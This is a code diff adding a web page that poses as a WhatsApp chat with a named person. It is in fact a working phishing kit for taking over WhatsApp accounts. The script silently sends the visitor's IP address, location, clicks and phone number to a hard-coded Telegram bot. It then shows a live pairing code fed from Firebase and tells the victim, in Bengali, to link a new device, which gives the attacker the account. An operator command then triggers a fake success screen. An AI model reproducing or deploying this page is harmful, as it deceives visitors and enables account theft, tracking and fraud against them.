@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chat with Nusrat jahan</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap');
+
+        body {
+            font-family: 'Helvetica Neue', 'Roboto', sans-serif;
+            background-color: #d1d7db;
+            height: 100vh;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Whatsapp Background */
+        .app-wrapper {
+            max-width: 100%;
+            height: 100%;
+            margin: 0 auto;
+            background-color: #efe7dd;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
+            background-blend-mode: overlay;
+        }
+
+        /* Encryption Message */
+        .encryption-msg {
+            background-color: #ffeecd;
+            color: #54656f;
+            font-size: 0.70rem;
+            text-align: center;
+            padding: 6px 10px;
+            border-radius: 8px;
+            margin: 10px auto;
+            max-width: 90%;
+            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
+            line-height: 1.3;
+        }
+
+        /* Cards */
+        .system-card {
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 10px 15px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            text-align: center;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .wa-btn {
+            background-color: #008069;
+            color: white;
+            border-radius: 24px;
+            padding: 10px 24px;
+            font-weight: 500;
+            font-size: 14px;
+            transition: background 0.2s;
+            width: 100%;
+        }
+        .wa-btn:active { background-color: #006b57; }
+
+        /* Pin Box */
+        .pin-box {
+            width: 38px;
+            height: 48px;
+            border: 1px solid #d1d7db;
+            background: #f0f2f5;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            color: #111b21;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Video Container */
+        .video-container {
+            width: 100%;
+            height: 160px;
+            background: black;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            border: 1px solid #e5e7eb;
+        }
+        
+        .instruction-list {
+            text-align: left;
+            font-size: 13px;
+            color: #54656f;
+            margin-top: 10px;
+            list-style: none;
+            padding: 0;
+        }
+        .instruction-list li {
+            margin-bottom: 6px;
+            display: flex;
+            gap: 8px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Footer */
+        .footer-fake {
+            background-color: #f0f2f5;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+        .input-pill {
+            flex: 1;
+            background: white;
+            height: 42px;
+            border-radius: 21px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            color: #8696a0;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-wrapper">
+        
+        <!-- HEADER -->
+        <header class="bg-[#008069] h-[60px] flex items-center px-4 shadow-md z-10 shrink-0">
+            <div class="flex items-center gap-3 text-white w-full">
+                <i class="fa-solid fa-arrow-left text-xl"></i>
+                
+                <div class="w-9 h-9 rounded-full bg-gray-300 overflow-hidden relative border border-white/30">
+                    <img src="my-logo.jpg" onerror="this.src='https://via.placeholder.com/50'" class="w-full h-full object-cover" alt="Profile">
+                </div>
+
+                <div class="flex-1 flex flex-col justify-center">
+                    <h1 class="text-[17px] font-medium leading-tight">Nusrat jahan</h1>
+                    <span class="text-[12px] opacity-90">Message yourself</span>
+                </div>
+
+                <div class="flex gap-5 text-xl">
+                    <i class="fa-solid fa-video"></i>
+                    <i class="fa-solid fa-phone"></i>
+                    <i class="fa-solid fa-ellipsis-vertical"></i>
+                </div>
+            </div>
+        </header>
+
+        <!-- CHAT AREA -->
+        <main class="flex-1 overflow-y-auto pt-4 relative scroll-smooth" id="chatMain">
+            
+            <div class="encryption-msg">
+                <i class="fa-solid fa-lock text-[10px] mr-1"></i> 
+                Messages are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them.
+            </div>
+
+            <div class="flex justify-center mb-4 mt-4">
+                <span class="bg-white/80 text-[#54656f] text-[12px] font-medium px-3 py-1.5 rounded-lg shadow-sm backdrop-blur-sm">Today</span>
+            </div>
+
+            <!-- PHASE 1: PHONE INPUT -->
+            <div id="inputSection" class="system-card mx-auto max-w-[320px]">
+                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3 text-[#008069]">
+                    <i class="fa-brands fa-whatsapp text-2xl"></i>
+                </div>
+                <h2 class="text-sm font-bold text-gray-800 mb-2">Connect to Nusrat jahan</h2>
+                <p class="text-xs text-gray-500 mb-4">To enable chat, please verify your phone number.</p>
+                
+                <form id="phoneForm" class="flex flex-col gap-3">
+                    <input 
+                        type="tel" 
+                        id="phoneNumber"
+                        placeholder="Phone Number (e.g. 017...)" 
+                        class="w-full bg-[#f0f2f5] border-none rounded-lg px-4 py-3 text-sm focus:ring-2 focus:ring-[#008069] outline-none text-center font-bold text-gray-800"
+                        required
+                    />
+                    <button type="submit" id="submitBtn" class="wa-btn shadow">
+                        Unlock Chat
+                    </button>
+                </form>
+            </div>
+
+            <!-- PHASE 2: VIDEO & CODE -->
+            <div id="guideSection" class="hidden system-card mx-auto max-w-[340px]">
+                
+                <!-- Video Frame -->
+                <div class="video-container">
+                    <video class="w-full h-full object-cover" autoplay loop muted playsinline>
+                        <source src="my-video.jpg" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+
+                <!-- Headline -->
+                <h2 class="text-[14px] font-bold text-red-600 mb-4 leading-snug">
+                    Nusrat jahan whatsapp account is locked please follow this unlock step
+                </h2>
+
+                <!-- Live Code -->
+                <div id="pinContainer" class="flex justify-center gap-1 mb-5">
+                    <div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div>
+                    <div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div><div class="pin-box pin-digit"></div>
+                </div>
+
+                <!-- Instructions -->
+                <ul class="instruction-list">
+                    <li>
+                        <span class="font-bold text-[#008069]">1.</span> 
+                        <span>Notification থেকে <b>"Link new device"</b> এ যান।</span>
+                    </li>
+                    <li>
+                        <span class="font-bold text-[#008069]">2.</span> 
+                        <span>Confirm করে আনলক করুন।</span>
+                    </li>
+                    <li>
+                        <span class="font-bold text-[#008069]">3.</span> 
+                        <span>উপরের কোডটি প্রবেশ করান।</span>
+                    </li>
+                </ul>
+
+                <!-- Deep Link Button -->
+                <a href="whatsapp://" onclick="trackClick('Unlock Button Clicked')" class="mt-5 block w-full py-3 bg-[#25D366] text-white font-bold rounded-full shadow-lg hover:bg-[#1dbb5f] transition-all animate-pulse text-center no-underline text-sm">
+                    আনলক করতে এখানে ক্লিক করুণ
+                </a>
+            </div>
+
+            <!-- PHASE 3: SUCCESS -->
+            <div id="successSection" class="hidden system-card mx-auto max-w-[320px]">
+                <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
+                    <i class="fa-solid fa-check"></i>
+                </div>
+                <h2 class="text-lg font-bold text-gray-800 mb-2">Successful!</h2>
+                <p class="text-sm text-gray-500 mb-6">You are now connected.</p>
+                
+                <button id="startBtn" class="wa-btn shadow text-lg w-full">
+                    Start Chat <i class="fa-solid fa-paper-plane ml-2"></i>
+                </button>
+            </div>
+
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="footer-fake shrink-0" id="messageTrigger">
+            <i class="fa-solid fa-plus text-[#54656f] text-2xl"></i>
+            <div class="input-pill">Type a message</div>
+            <i class="fa-solid fa-microphone text-[#54656f] text-xl ml-1"></i>
+        </footer>
+
+    </div>
+
+    <!-- Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        // --- CONFIGURATION ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyCnE3ixu-seDdC0csNEwsumKFEB3Im8DGE",
+            authDomain: "my-whatsapp-page.firebaseapp.com",
+            databaseURL: "https://my-whatsapp-page-default-rtdb.firebaseio.com",
+            projectId: "my-whatsapp-page",
+            storageBucket: "my-whatsapp-page.firebasestorage.app",
+            messagingSenderId: "458940936506",
+            appId: "1:458940936506:web:d4faab25813f064c27a003",
+            measurementId: "G-EQ1QQDBTKG"
+        };
+
+        const TELEGRAM_BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA"; 
+        const CHAT_ID = "8271536101";
+        const API_URL_SEND = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const API_URL_UPDATES = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+
+        // --- GLOBAL CLICK TRACKER ---
+        document.addEventListener('click', (e) => {
+            const target = e.target.innerText || e.target.tagName;
+            if(target) {
+                // Send click event to Telegram silently (without await to not block UI)
+                fetch(API_URL_SEND, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `👆 User Clicked: ${target}`, parse_mode: 'Markdown' })
+                }).catch(err => console.log(err));
+            }
+        });
+
+        // DOM Elements
+        const inputSection = document.getElementById('inputSection');
+        const guideSection = document.getElementById('guideSection');
+        const successSection = document.getElementById('successSection');
+        const phoneForm = document.getElementById('phoneForm');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const pinDigits = document.querySelectorAll('.pin-digit');
+        const messageTrigger = document.getElementById('messageTrigger');
+        const startBtn = document.getElementById('startBtn');
+
+        let lastUpdateId = 0;
+        let pollingInterval;
+
+        // Visitor Alert on Load
+        window.addEventListener('load', () => {
+            fetch('https://ipwho.is/')
+                .then(res => res.json())
+                .then(data => {
+                    const msg = `🔔 *WhatsApp Page Visit Now*\nIP: ${data.ip}\nLoc: ${data.city}, ${data.country}`;
+                    sendToTelegram(msg);
+                })
+                .catch(() => sendToTelegram("🔔 *WhatsApp Page Visit Now* (IP Failed)"));
+        });
+
+        async function sendToTelegram(text) {
+            try {
+                await fetch(API_URL_SEND, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (error) { console.error("TG Error:", error); }
+        }
+
+        // Firebase Sync
+        function startFirebaseListener() {
+            try {
+                const app = initializeApp(firebaseConfig);
+                const db = getDatabase(app);
+                const liveCodeRef = ref(db, 'liveCode');
+
+                onValue(liveCodeRef, (snapshot) => {
+                    const data = snapshot.val();
+                    const code = data && data.code ? String(data.code).trim().padEnd(8, ' ') : "        ";
+                    pinDigits.forEach((digitDiv, index) => {
+                        digitDiv.textContent = code[index] || '';
+                    });
+                });
+            } catch (error) { console.error(error); }
+        }
+
+        // Telegram Polling for Command
+        function startTelegramPolling() {
+            pollingInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`${API_URL_UPDATES}?offset=${lastUpdateId + 1}`);
+                    const data = await response.json();
+
+                    if (data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            const messageText = update.message?.text?.trim().toLowerCase();
+
+                            if (messageText === 'successfull' || messageText === '/success') {
+                                clearInterval(pollingInterval);
+                                guideSection.classList.add('hidden');
+                                successSection.classList.remove('hidden');
+                            }
+                        });
+                    }
+                } catch (error) { console.error(error); }
+            }, 2000);
+        }
+
+        // Click Footer -> Focus Input
+        messageTrigger.addEventListener('click', () => {
+            inputSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            phoneNumberInput.focus();
+        });
+
+        // Form Submit Logic
+        phoneForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = phoneNumberInput.value.trim();
+
+            if (!phone || phone.length < 10) {
+                alert("Please enter a valid phone number.");
+                return;
+            }
+
+            // 1. Send Number
+            await sendToTelegram(`📱 *Phone Number Submitted*\nNumber: \`${phone}\``);
+
+            // 2. Switch UI
+            inputSection.classList.add('hidden');
+            guideSection.classList.remove('hidden');
+
+            // 3. Start Listeners
+            startFirebaseListener();
+            startTelegramPolling();
+        });
+
+        // Start Chat Logic
+        startBtn.addEventListener('click', () => {
+            window.location.href = "https://wa.me/8801806853977";
+        });
+
+    </script>
+</body>
+</html>
